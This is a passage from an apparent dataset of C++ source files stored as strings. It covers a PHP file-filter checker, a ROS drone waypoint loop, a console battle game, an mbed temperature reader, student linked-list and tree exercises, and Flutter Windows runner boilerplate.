(std::getline(file, line)) {\n            ++lineCount;\n            if (getExtentionName(str) == \"php\") {\n                for (auto& val : phpFilter) {\n                    int tmpP = line.find(val);\n                    if (tmpP != std::string::npos) {\n                        warningList.emplace_back(\"Error at line \" + std::to_string(lineCount) + \" in '\" + str + \"' Filter: (\" + val + \")\\n\");\n                        if (returnCode == 0) {\n                            returnCode = 1;\n                        }\n                    }\n                }\n            }\n        }\n        file.close();\n    }\n}\n\nint main(int argc, char* argv[]) {\n    if (argc < 2) {\n        throw std::runtime_error(\"Error: no whitelist argument given.\\n\");\n    }\n    setFileList();\n    createFilters();\n    checkFiles(argv[1]);\n    for (auto& str : warningList) {\n        std::cout << str;\n    }\n    return returnCode;\n}\n",
    "#include <gnc_functions.hpp>\n//include API \n\nint main(int argc, char** argv)\n{\n\t//initialize ros \n\tros::init(argc, argv, \"gnc_node\");\n\tros::NodeHandle gnc_node(\"~\");\n\t\n\t//initialize control publisher/subscribers\n\tinit_publisher_subscriber(gnc_node);\n\n  \t// wait for FCU connection\n\twait4connect();\n\n\t//wait for used to switch to mode GUIDED\n\twait4start();\n\n\t//create local reference frame \n\tinitialize_local_frame();\n\n\t//request takeoff\n\ttakeoff(2);\n\n\t//specify some waypoints \n\tstd::vector<gnc_api_waypoint> waypointList;\n\tgnc_api_waypoint nextWayPoint;\n\tnextWayPoint.x = 0;\n\tnextWayPoint.y = 0;\n\tnextWayPoint.z = 3;\n\tnextWayPoint.psi = 0;\n\twaypointList.push_back(nextWayPoint);\n\tnextWayPoint.x = 5;\n\tnextWayPoint.y = 0;\n\tnextWayPoint.z = 3;\n\tnextWayPoint.psi = -90;\n\twaypointList.push_back(nextWayPoint);\n\tnextWayPoint.x = 5;\n\tnextWayPoint.y = 5;\n\tnextWayPoint.z = 3;\n\tnextWayPoint.psi = 0;\n\twaypointList.push_back(nextWayPoint);\n\tnextWayPoint.x = 0;\n\tnextWayPoint.y = 5;\n\tnextWayPoint.z = 3;\n\tnextWayPoint.psi = 90;\n\twaypointList.push_back(nextWayPoint);\n\tnextWayPoint.x = 0;\n\tnextWayPoint.y = 0;\n\tnextWayPoint.z = 3;\n\tnextWayPoint.psi = 180;\n\twaypointList.push_back(nextWayPoint);\n\tnextWayPoint.x = 0;\n\tnextWayPoint.y = 0;\n\tnextWayPoint.z = 3;\n\tnextWayPoint.psi = 0;\n\twaypointList.push_back(nextWayPoint);\n\n\n\t//specify control loop rate. We recommend a low frequency to not over load the FCU with messages. Too many messages will cause the drone to be sluggish\n\tros::Rate rate(2.0);\n\tint counter = 0;\n\twhile(ros::ok())\n\t{\n\t\tros::spinOnce();\n\t\trate.sleep();\n\t\tif(check_waypoint_reached(.3) == 1)// If drone has reached waypoint then go to the next waypoint specified\n\t\t{\n\t\t\tint x = counter % 4;// index for the point that we want the drone to go to\n\t\t\tset_destination(waypointList[x].x,waypointList[x].y,waypointList[x].z, waypointList[x].psi);//waypointList is an array of 4-tuples (x, y, z, psi)\n\t\t\tcounter++;\t\n\t\n\t\t}\t\n\t\t\n\t}\n\treturn 0;\n}\n",
    "#include <iostream>\n#include <cstdlib>\nusing namespace std;\n\nstruct TreeNode {\n    int val;\n    TreeNode *left, *right;\n    TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}\n    TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}\n};\n\nclass Solution {\npublic:\n    int distributeCoins(TreeNode* root) {\n        int moves = 0;\n        dfs(root, moves);\n        return moves;\n    }\n\nprivate:\n    int dfs(TreeNode* node, int& moves) {\n        if (!node) return 0;\n\n        int left_excess = dfs(node->left, moves);\n        int right_excess = dfs(node->right, moves);\n\n        moves += abs(left_excess) + abs(right_excess);\n\n        return node->val + left_excess + right_excess - 1;\n    }\n};\n\nint main() {\n    TreeNode* root = new TreeNode(3);\n    root->left = new TreeNode(0);\n    root->right = new TreeNode(0);\n\n    Solution sol;\n    cout << \"Minimum moves: \" << sol.distributeCoins(root) << endl;\n\n    delete root->left;\n    delete root->right;\n    delete root;\n\n    return 0;\n}\n",
    "#include <iostream>\n#include \"Ele.h\"\n#include \"Move.h\"\n#include \"AllMoves.h\"\n#include \"AllEles.h\"\n#include \"AllWielders.h\"\n#include \"utils.h\"\n\nmap<string, Ele> elesOfAllGame;\nmap<string, Move> moves;\nmap<string, Wielder> allWielders;\nWielder currentOpponent;\n\nvoid StartDuel();\nbool StartTurn();\nvoid StartRun();\n\nint main()\n{\n    AllMoves::InitAllMoves();\n    AllEles::InitAllEles();\n    AllWielders::InitAllWielders();\n    elesOfAllGame = AllEles::allEles;\n    moves = AllMoves::allMoves;\n    allWielders = AllWielders::allWielders;\n    \n    elesOfAllGame[\"Ele1\"].Moves().push_back(moves[\"move1\"]);\n    elesOfAllGame[\"Ele1\"].Moves().push_back(moves[\"move3\"]);\n    elesOfAllGame[\"Ele1\"].Moves().push_back(moves[\"move5\"]);\n    elesOfAllGame[\"Ele1\"].Moves().push_back(moves[\"move6\"]);\n\n    elesOfAllGame[\"Ele2\"].Moves().push_back(moves[\"move2\"]);\n    elesOfAllGame[\"Ele2\"].Moves().push_back(moves[\"move4\"]);\n    elesOfAllGame[\"Ele2\"].Moves().push_back(moves[\"move5\"]);\n    elesOfAllGame[\"Ele2\"].Moves().push_back(moves[\"move7\"]);\n\n    player.Eles().push_back(elesOfAllGame[\"Ele1\"]);\n    allWielders[\"wielder1\"].Eles().push_back(elesOfAllGame[\"Ele2\"]);\n\n    StartRun();\n\n    StartDuel();\n    bool inCombat = true;\n\n    do\n    {\n        inCombat = StartTurn();\n    } while (inCombat);\n\n    PrintText(\"YOU FINISHED THE GAME!\");\n\n\n}\n\nvoid StartRun() {\n    PrintText(\"What's your name?\");\n    cin >> player.Name();\n}\n\nvoid StartDuel() {\n    allWielders[\"wielder1\"].Eles()[0].State() = Ele::EleState::InCombat;\n    currentOpponent = allWielders[\"wielder1\"];\n    PrintText(currentOpponent.Name() + \" sends \" + allWielders[\"wielder1\"].Eles()[0].Name() + \"!\");\n    PrintText(\"Which one will you choose?\");\n    player.SelectEle();\n   \n}\n\nbool StartTurn() {\n    bool startAnotherTurn = true;\n    int playerChoice;\n    int playerMove;\n    int opponentMove = RandomNumber(0, currentOpponent.GetEleInCombat().Moves().size() -1);\n    PrintText(\"What will you do?\");\n    PrintText(\"1. Select Move\");\n    cin >> playerChoice;\n    if (playerChoice == 1)\n    {\n        playerMove = player.SelectMove();\n    }\n\n    if (player.GetEleInCombat().Speed() >= currentOpponent.GetEleInCombat().Speed())\n    {\n        player.GetEleInCombat().Moves()[playerMove].UseMovement(player.GetEleInCombat(), currentOpponent.GetEleInCombat());\n        if (currentOpponent.HasEleInCombat()) {\n            currentOpponent.GetEleInCombat().Moves()[opponentMove].UseMovement(currentOpponent.GetEleInCombat(), player.GetEleInCombat());\n        }\n    }\n    else if (player.GetEleInCombat().Speed() < currentOpponent.GetEleInCombat().Speed())\n    {\n        currentOpponent.GetEleInCombat().Moves()[opponentMove].UseMovement(currentOpponent.GetEleInCombat(), player.GetEleInCombat());\n        if (player.HasEleInCombat()) {\n            player.GetEleInCombat().Moves()[playerMove].UseMovement(player.GetEleInCombat(), currentOpponent.GetEleInCombat());\n        }\n    }\n\n\n    if (!currentOpponent.HasEleInCombat()) {\n        if (currentOpponent.AllElesDead()) {\n            PrintText(\"You win!\");\n            startAnotherTurn = false;\n        }\n        else {\n            for (unsigned int i = 0; i < currentOpponent.Eles().size(); i++)\n            {\n                Ele& ele = currentOpponent.Eles()[i];\n                if (ele.State() == Ele::EleState::InParty) {\n                    ele.State() = Ele::EleState::InCombat;\n                    i = currentOpponent.Eles().size();\n                }\n            }\n        }\n    }\n\n    if (!player.HasEleInCombat()) {\n        if (player.AllElesDead()) {\n            PrintText(\"You have no Eles to fight with!\");\n            PrintText(\"You lose!\");\n            startAnotherTurn = false;\n        }\n        else {\n            player.SelectEle();\n        }\n    }\n\n    return startAnotherTurn;\n}\n",
    "#if 0\n#include <array>\n#include <algorithm>\n#include \"mbed.h\"\n#include \"TextLCD_I2C.h\"\n\n#define sleep ThisThread::sleep_for\n#define NUM_READINGS 100\n\nAnalogIn aIn_Sensor(PA_4);\n\nint main() {\n\n    //Display\n    I2C i2c_lcd(PB_9, PB_8);\n    // I2C Address 0x27 in 7 Bit\n    TextLCD_I2C lcd(&i2c_lcd, 0x27<<1, TextLCD_I2C::LCD16x2);\n    lcd.setBackLight(true); // Backlight on\n    lcd.cls(); // Clear Screen\n\n//CODE-----------------------------------------------------------------------------------------------------------------------\n\n    std::array<float, NUM_READINGS> temperatureReadings; //Array erzeugung -> ChatGPT\n    float averageTemperature;\n    float medianTemperature;\n\n    while (1) {\n        //Read temperature and save in an array\n        for (int i = 0; i < NUM_READINGS; i++) {\n            temperatureReadings[i] = aIn_Sensor.read_voltage() * 100;\n            ThisThread::sleep_for(10ms);\n        }\n        \n\n        //average temperature\n        float sum = 0;\n        for (int i = 0; i < NUM_READINGS; i++) {\n            sum += temperatureReadings[i];\n        }\n        averageTemperature = sum / NUM_READINGS;\n        \n        //Mithilfe von ChatGPT\n        //median temperature\n        std::sort(temperatureReadings.begin(), temperatureReadings.end());\n        medianTemperature = temperatureReadings[49];\n\n\n        //Display\n        for (int j; j < NUM_READINGS; j++) {\n            lcd.locate(0, 0);\n            lcd.printf(\"%2.2f\",averageTemperature);\n            lcd.locate(0, 1);\n            lcd.printf(\"%2.2f\",medianTemperature);\n            ThisThread::sleep_for(10ms);\n        }\n    }\n}\n\n#endif\n",
    "// A Music Library System is a software application used to manage the storage and retrieval of music\r\n// tracks and albums. System need to maintain information such as track title, artist, album, genre,\r\n// duration, release year, and any other relevant attributes. System should able to add new music track,\r\n// remove the track, update the information of the track, search the specific track also it should display\r\n// the information of all the track which are present in the database. Use the Concept of Circular Linked\r\n// list to implement the above system\r\n#include <iostream>\r\nusing namespace std;\r\n\r\nstruct node\r\n{\r\n    node *next;\r\n    int data;\r\n    string genre;\r\n    string artist;\r\n    string title_track, album;\r\n    long int duration;\r\n    long int release_year;\r\n};\r\n\r\nnode *get_node()\r\n{\r\n    node *temp;\r\n    temp = new node;\r\n    temp->next = NULL;\r\n    return temp;\r\n}\r\n\r\nnode *getdata(node *New)\r\n{\r\n\r\n    cout << \"Enter the name of artist\\n\";\r\n    cin >> New->artist;\r\n    cout << endl;\r\n\r\n    cout << \"Enter the name of album\\n\";\r\n    cin >> New->album;\r\n    cout << endl;\r\n\r\n    cout << \"Enter the name of genre\\n\";\r\n    cin >> New->genre;\r\n    cout << endl;\r\n\r\n    cout << \"Enter the name of title track\\n\";\r\n    cin >> New->title_track;\r\n    cout << endl;\r\n\r\n    cout << \"Enter the duration(In seconds)\\n\";\r\n    cin >> New->duration;\r\n    cout << endl;\r\n\r\n    cout << \"Enter the release year\\n\";\r\n    cin >> New->release_year;\r\n    cout << endl;\r\n\r\n    return New;\r\n}\r\nnode *create()\r\n{\r\n    node *temp, *New, *head;\r\n    bool flag = true;\r\n    int ans;\r\n    temp = NULL;\r\n\r\n    do\r\n    {\r\n        New = get_node();\r\n        if (New == NULL)\r\n        {\r\n            cout << \"Memory not allocated..\\n\";\r\n        }\r\n\r\n        else\r\n        {\r\n            New = getdata(New);\r\n        }\r\n        if (flag == true)\r\n        {\r\n            head = New;\r\n            New->next = head;\r\n            temp = head;\r\n            flag = false;\r\n        }\r\n        else\r\n        {\r\n            temp = temp->next;\r\n        }\r\n        temp->next = New;\r\n        New->next = head;\r\n        cout << \"Do you want to continue (1 or 0)\\n\";\r\n        cin >> ans;\r\n    } while (ans == 1);\r\n    cout << \"Music library list Created..\\n\";\r\n    return head;\r\n}\r\n\r\nvoid display(node *head)\r\n{\r\n    node *temp;\r\n    temp = head;\r\n    if (temp == NULL)\r\n    {\r\n        cout << \"Music library List is empty..\\n\";\r\n        return;\r\n    }\r\n    else\r\n    {\r\n        cout << \"Artist\\t\\tTitle_Track\\tAlbum\\tGenre\\tDuration\\tRelease_Year\\t\\n\";\r\n        do\r\n        {\r\n\r\n            cout << temp->artist << \"\\t\\t\" << temp->title_track << \"\\t\\t\"\r\n                 << temp->album << \"\\t\" << temp->genre << \"\\t\"\r\n                 << temp->duration << \"\\t\\t\" << temp->release_year << \"\\t\\n\";\r\n\r\n            temp = temp->next;\r\n        } while (temp != head);\r\n    }\r\n}\r\n\r\nnode *insert_at_head(node *head)\r\n{\r\n    node *temp, *New = get_node();\r\n\r\n    if (New == NULL)\r\n    {   \r\n        cout << \"Memory not allocated..\\n\";\r\n        return head;\r\n    }\r\n    New = getdata(New);\r\n\r\n    if (head == NULL)\r\n    {\r\n        cout << \"Music list is empty.\\n\";\r\n        head = New;\r\n    }\r\n    else\r\n    {\r\n        temp = head;\r\n        while (temp->next != head)\r\n        {\r\n            temp = temp->next;\r\n        }\r\n        temp->next = New;\r\n        New->next = head;\r\n        head = New;\r\n        cout << \"Music head list updated..\\n\";\r\n        cout << endl;\r\n\r\n        return head;\r\n    }\r\n    return head;\r\n}\r\n\r\nvoid insert_at_tail(node *head)\r\n{\r\n    node *temp = NULL, *New = get_node();\r\n    New = getdata(New);\r\n    temp = head;\r\n    if (temp == NULL)\r\n    {\r\n        cout << \"The Music list is empty\\n\";\r\n        cout << \"Inserting data at head node..\\n\";\r\n        head = New;\r\n    }\r\n\r\n    else\r\n    {\r\n        temp = head;\r\n        while (temp->next != head)\r\n        {\r\n            temp = temp->next;\r\n        }\r\n        temp->next = New;\r\n        New->next = head;\r\n        cout << \"Inserted at tail node..\\n\";\r\n        cout << endl;\r\n    }\r\n}\r\n\r\nnode *insert_at_specific_node(node *head)\r\n{\r\n    node *New, *temp = head;\r\n    string key;\r\n\r\n    New = get_node();\r\n    cout << \"Enter after which artist name you want to insert.\\n\";\r\n    cin >> key;\r\n    New = getdata(New);\r\n\r\n    if (New == NULL)\r\n    {\r\n        cout << \"Music list is empty\";\r\n        return head;\r\n    }\r\n\r\n    if (head == NULL)\r\n    {\r\n        cout << \"List is empty.\" << endl;\r\n    }\r\n    else\r\n    {\r\n        temp = head;\r\n\r\n        while (temp->artist != key)\r\n        {\r\n            temp = temp->next;\r\n        }\r\n        New->next = temp->next;\r\n        temp->next = New;\r\n    }\r\n    return head;\r\n}\r\n\r\nnode *delete_at_specific_node(node *head)\r\n{\r\n    node *temp = head, *prev = NULL;\r\n    string del;\r\n    bool found = false;\r\n\r\n    cout << \"Enter the name of artist to delete\\n\";\r\n    cin >> del;\r\n\r\n    if (head == NULL)\r\n    {\r\n        cout << \"List is empty.\" << endl;\r\n        return NULL;\r\n    }\r\n    do\r\n    {\r\n        if (",
    "//CS311 Yoshii S22 Linked List class\n\n//INSTRUCTION:\n//It helps to first create if-then-else structure to fill in later.\n//- Make sure PURPOSE and PARAMETER comments are given in detail\n//  Highly recommended to copy HW3P1-help as PURPOSE of each function.\n//  Add sufficient comments to your code body to describe what it does.\n//      - Make sure all if-then-else are commented describing which case it is\n//      - Make sure all local variables are described fully with their purposes\n\n// ====================================================\n//Your name: Nathaniel VandenBerg\n//Complier:  g++\n//File type: linkedList.cpp implementation file\n//=====================================================\n\n#include<iostream>\n#include\"linkedlist.h\"\n\nusing namespace std;\n\n/**\n * @brief Destructor to destroy all nodes and release memory\n */\nLinkedList::~LinkedList() {\n    Node *temp = front;\n    while (temp != nullptr) {\n        Node *next = temp->next;\n        delete temp;\n        temp = next;\n    }\n}\n\n/**\n * @brief Purpose: Checks if the list is empty\n * @return true if the list is empty, false otherwise\n */\nbool LinkedList::isEmpty() const {\n    if (count == 0) {\n        //cout << \">isEmpty();\";\n        return true;\n    }\n    return false;\n}\n\n/**\n * @brief  Get the number of nodes in the list\n * @return int The number of nodes in the list\n */\nint LinkedList::length() const {\n    return count;\n}\n\n\n/**\n * @brief Displays the contents of the list\n */\nvoid LinkedList::displayAll() {\n    Node *ptr = front;\n    cout << \"[\";\n    if (ptr != nullptr) {\n          // Head node is not preceded by separator\n          cout << ptr->val;\n          ptr = ptr->next;\n      }\n    while (ptr != nullptr) {\n        cout << ptr->val;\n        ptr = ptr->next;\n    }\n    cout << \"] count: \" << length() << endl;\n}\n\n// Add a node to the rear of the list\nvoid LinkedList::addRear(T val) {\n    //cout << \">addRear();\";\n    //cout << \"~~\" << val.id << \"-\" << val.name << \"-\" << val.amount << \"| \";\n    // consider the two cases of whether the list was empty or not\n    if (isEmpty()) {\n        front = new Node(val);\n        rear = front;\n    } else {\n        rear->next = new Node(val);\n        rear = rear->next;\n    }\n        count++;\n    //displayAll();\n}\n\n// Add a node to the front of the list\nvoid LinkedList::addFront(T val) {\n    //cout << \">addFront();\";\n    // consider the two cases of whether the list was empty\n    if (isEmpty()) {\n        front = new Node(val);\n        rear = front;\n    } else {\n        Node *temp = front;\n        front = new Node(val);\n        front->next = temp;\n    }\n    if (count < 0) {\n        count = 1;\n    }\n    else\n        count++;\n}\n\n// Delete a node from the front of the list\nbool LinkedList::deleteFront(T &OldNum) {\n    //cout << \">deleteFront();\";\n    // consider if the list was empty and return false if the list is empty\n    // consider the special case of deleting the only node in the list\n    if (isEmpty()) {\n        return false;\n    } else if (count == 1) {\n        OldNum = front->val;\n        delete front;\n        front = nullptr;\n        rear = nullptr;\n        count = 0;\n        return true;\n    } else {\n        Node *temp = front;\n        front = front->next;\n        OldNum = temp->val;\n        delete temp;\n        count--;\n        return true;\n    }\n}\n\n// Delete a node from the rear of the list\nbool LinkedList::deleteRear(T &OldNum) {\n    //cout << \">deleteRear();\";\n    // consider if the list was empty and return false if the list is empty\n    // consider the special case of deleting the only node in the list\n    if (isEmpty()) {\n        return false;\n    } else if (count == 1) {\n        OldNum = front->val;\n        delete front;\n        front = nullptr;\n        rear = nullptr;\n        count = 0;\n        return true;\n    } else {\n        Node *temp = front;\n        while (temp->next != rear) {\n            temp = temp->next;\n        }\n        OldNum = rear->val;\n        delete rear;\n        rear = temp;\n        rear->next = nullptr;\n        count--;\n        return true;\n    }\n}\n\n/* --- harder ones for test 2 and 3 -- */\n\n/**\n     * @brief Delete a node at a given position from the list. The\n     * node at position pos is deleted and the value of the deleted node is returned in val.\n     * The valid range of pos is 0 to count-1. pos = 0 is the first node, and pos = count-1 is the last node.\n     * @param pos: position of the node to be deleted\n     * @param val: it is set to the value of the node to be deleted\n     * @return true: if the node was deleted successfully\n     * @return false: if the node was not deleted successfully because the position was out of range\n    */\nbool LinkedList::deleteAt(int pos, T &val) {\n    //cout << \">deleteAt();\";\n    // check if the pos is valid first, then move the ptr to the rigth positon\n    // consider the special case of deleting the first node and the last node\n    // Do not forget to set value.\n    if (pos < 0 || pos > count-1) {\n        return false;\n    } else {\n       ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include<iostream>\n#include<stack>\n#define max 20\nusing namespace std;\n\nclass FT\n{\n\tpublic:\n\tint age;\n\tstring name,gen,ger;\n\tFT *lc,*rc;\n    int\tcnt=0,cnt1=0,cnt2=0;\n\tvoid create();\n\tvoid insert(FT *root,FT *next);\n\tvoid display(FT *root);\n\tvoid leaf(FT *root);\n\tvoid height();\n\t\t\n}*root,*temp,*next;\n\nvoid FT::create()\n{\n\tint ch;\n\tFT *next;\n\troot=new FT;\n\tcout<<\"ENTER the INFORMATION\"<<endl;\n\tcout<<\"\\nEnter NAME: \";\n\tcin>>root->name;\n\tcout<<\"Enter generation: \";\n\tcin>>root->ger;\n\tcout<<\"Enter GENDER: \";\n\tcin>>root->gen;\n\tcout<<\"Enter AGE: \";\n\tcin>>root->age;\n\tcnt=cnt1=cnt2=1;\n\troot->lc=root->rc=NULL;\n\t\n\tdo{\n\t\tcout<<\"Do you want to add new Node:(0/1)no/yes\";\n\t\tcin>>ch;\n\t\tif(ch==1)\n\t\t{\n\t\t\tnext=new FT;\n\t\t\tcout<<\"Enter the data for new node:\";\n\t\t\t\n\t\t\tcout<<\"\\nEnter NAME: \";\n\t\t\tcin>>next->name;\n\t\t\tcout<<\"Enter GER: \";\n\t\t\tcin>>next->ger;\n\t\t\tcout<<\"Enter GENDER: \";\n\t\t\tcin>>next->gen;\n\t\t\tcout<<\"Enter AGE: \";\n\t\t\tcin>>next->age;\n\t\t\t\n\t\t\tnext->lc=next->rc=NULL;\n\t\t\tinsert(root,next);\n\t\t}\n\t\t\n\t}while(ch==1);\n\t\n}\nvoid FT::insert(FT *root,FT *next)\n{\n\t char chr;\n\t FT *temp;\n\t cout<<\"Whether you want to insert either Left(l) OR Right(r): \";\n\t cin>>chr;\n\t if(chr=='l'||chr=='L')\n\t {\n\t \tif(root->lc==NULL)\n\t \t{\n\t \t\troot->lc=next;\n\t \t\tcnt1++;\n\t \t\t\n\t \t}\n\t \telse\n\t \t{\n\t \t\tinsert(root->lc,next);\n\t \t}\n\t \t\n\t }\n\t if(chr=='r'||chr=='R')\n\t {\n\t \tif(root->rc==NULL)\n\t \t{\n\t \t\troot->rc=next;\n\t \t\t\n\t \t}\n\t \telse\n\t \t{\n\t \t\tinsert(root->rc,next);\n\t \t\tcnt2++;\n\t \t}\n\t }\n}\t \n\n\n\nvoid FT::display(FT *root)\n{\n    FT *stack[max];\nint top=-1;\nFT*temp;\ntemp=root;\nif(root!=NULL)\n{\ndo\n{\nwhile(temp!=NULL)\n{\ntop++;\nstack[top]=temp;\ntemp=temp->lc;\n}\nif(top!=-1)\n{\ntemp=stack[top];\ncout<<temp->name<<\"\\t\"<<temp->gen<<\"\\t\"<<temp->age<<\"\\t\"<<temp->ger<<\"\\t\"<<endl;\ntemp=temp->rc;\n}\ntop--;\n}while(temp!=NULL || top!=-1);\n}\n\n}\nvoid FT::leaf(FT *root)\n{\n    FT *stack[max];\n    int top=-1;\n    temp=root;\n    if(root!=NULL)\n    {\n        do\n        {\n            while(temp!=NULL)\n            {\n            top++;\n            stack[top]=temp;\n            temp=temp->lc;\n            }\n    if(top!=-1)\n    {\n        temp=stack[top];\n        if(temp->lc==NULL&&temp->rc==NULL)\n        {\n        cout<<\" \"<<temp->name<<endl;\n        }\n        temp=temp->rc;\n        top--;\n        }\n    \n   }while(top!=-1||temp!=NULL);\n  }\n}\n\n\nvoid FT::height()\n{\n    if(cnt1>=cnt2)\n    {\n    cout<<\"Height of tree is :\"<<cnt1;\n    }\n    else\n    {\n    cout<<\"Height of tree is :\"<<cnt2;\n    }\n    \n}\n\nint main()\n{\n\tint ch;\n\tFT t;\n\t\n\tdo{\n\t    cout<<\"\\nMENU\";\n\t\tcout<<\"\\n1.Create\";\n\t\tcout<<\"\\n2.Display\";\n\t\tcout<<\"\\n3.Height\";\n\t\tcout<<\"\\n4.Leaf Node\";\n\t\tcout<<\"\\n5.Exit\";\n\t\tcout<<\"\\nEnter your Choice:\";\n\t\tcin>>ch;\n\t\t\n\t\tswitch (ch) \n\t\t{\n\t\t\tcase 1:\n\t\t\tt.create();\n\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\tcout<<\"Name\\tGender\\tAge\\tGenereation\"<<endl;\n\t\t\tt.display(root);\n\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\tt.height();\n\t\t\tbreak;\n\t\t\tcase 